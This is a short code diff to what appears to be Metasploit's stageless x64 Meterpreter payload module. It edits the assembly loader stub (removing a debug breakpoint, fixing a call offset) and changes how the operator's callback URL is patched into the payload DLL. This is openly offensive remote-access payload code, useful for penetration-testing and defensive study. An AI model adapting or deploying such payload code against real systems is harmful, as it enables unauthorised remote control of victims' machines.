@@ -1,6 +1,7 @@
 #-*- coding: binary -*-
 
 require 'msf/core'
+require 'rex/payloads/meterpreter/patch'
 
 module Msf
 
@@ -19,14 +20,14 @@ module Payload::Windows::StagelessMeterpreter_x64
   def asm_invoke_metsrv(opts={})
     asm = %Q^
         ; prologue
+        ; int 03
           pop r10               ; 'MZ'
-          int 03
           push r10              ; back to where we started
           push rbp              ; save rbp
           mov rbp, rsp          ; set up a new stack frame
           sub rsp, 32           ; allocate some space for calls.
         ; GetPC
-          call $+9              ; relative call to get location
+          call $+5              ; relative call to get location
           pop rbx               ; pop return value
           ;lea rbx, [rel+0]      ; get the VA for the start of this stub
         ; Invoke ReflectiveLoader()
@@ -77,10 +78,12 @@ module Payload::Windows::StagelessMeterpreter_x64
 
     # the URL might not be given, as it might be patched in some other way
     if url
-      url = "s#{url}\x00"
-      location = dll.index("https://#{'X' * 256}")
-      if location
-        dll[location, url.length] = url
+      # Patch the URL using the patcher as this upports both ASCII and WCHAR.
+      unless Rex::Payloads::Meterpreter::Patch.patch_string!(dll, "https://#{'X' * 512}", "s#{url}\x00")
+        # If the patching failed this could mean that we are somehow
+        # working with outdated binaries, so try to patch with the
+        # old stuff.
+        Rex::Payloads::Meterpreter::Patch.patch_string!(dll, "https://#{'X' * 256}", "s#{url}\x00")
       end
     end
 
